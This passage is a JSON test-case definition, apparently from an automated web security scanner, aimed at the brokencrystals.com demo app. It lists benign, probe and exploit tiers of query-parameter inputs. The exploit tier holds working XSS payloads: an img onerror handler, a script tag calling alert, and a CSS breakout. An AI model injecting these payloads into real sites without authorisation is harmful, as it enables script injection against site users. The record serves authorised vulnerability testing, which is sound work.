    {
      "id": "tc-hyp-5",
      "hypothesis_id": "hyp-5",
      "base_url": "https://brokencrystals.com",
      "method": "GET",
      "endpoint": "/",
      "parameter": "config,description,theme-color,viewport",
      "payloads": [
        {
          "tier": "benign",
          "payloads": [
            {
              "location": "query",
              "value": "config=baseline"
            },
            {
              "location": "query",
              "value": "description=baseline"
            },
            {
              "location": "query",
              "value": "theme-color=baseline"
            },
            {
              "location": "query",
              "value": "viewport=width=device-width"
            }
          ],
          "description": "Baseline with multiple benign params"
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "query",
              "value": "config=<DOM-CHK-AAA>"
            },
            {
              "location": "query",
              "value": "description=<DOM-CHK-BBB>"
            },
            {
              "location": "query",
              "value": "theme-color=<DOM-CHK-CCC>"
            },
            {
              "location": "query",
              "value": "viewport=<DOM-CHK-DDD>"
            }
          ],
          "description": "Probe multiple params for DOM sinks and combined reflection"
        },
        {
          "tier": "exploit",
          "payloads": [
            {
              "location": "query",
              "value": "config=\" + document.domain + \""
            },
            {
              "location": "query",
              "value": "description=\"><img src=x onerror=console.log('dom')>"
            },
            {
              "location": "query",
              "value": "theme-color=');/*css*/body{background:red}/*"
            },
            {
              "location": "query",
              "value": "viewport=\">'><script>/*dom*/alert(5)</script>"
            }
          ],
          "description": "Combined payloads aiming to trigger DOM-sourced XSS when multiple params are used together; non-destructive variants"
        }
      ],
      "prerequisites": [
        {
          "type": "login",
          "description": "Authenticated session required (connect.sid cookie)"
        }
      ],
      "oracle_rules": [
        {
          "signal": "xss_payload_executed",
          "condition": "javascript_executed_in_browser_context == true",
          "weight": 1.0
        },
        {
          "signal": "reflected_input",
          "condition": "any(payload_value in response.body for payload_value in injected_values)",
          "weight": 0.9
        }
      ],
      "pass_logic": "any",
      "safety": {
        "idempotent_required": true,
        "destructive_ok": false,
        "max_requests": 20
      },
